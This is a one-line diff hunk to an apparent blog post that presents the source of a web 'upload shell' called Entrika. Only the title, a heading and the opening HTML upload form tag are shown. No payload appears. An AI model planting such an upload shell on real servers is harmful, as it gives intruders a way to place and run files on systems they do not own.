@@ -15,6 +15,7 @@ tags:
 ---
 Entrika upload shell &#8211; javascript and a little bit of PHP.
 
+
 ### Entrika upload shell source code
 
 {% highlight php %}&lt;FORM ENCTYPE="multipart/form-data" ACTION="uploader.php" METHOD="POST"&gt;
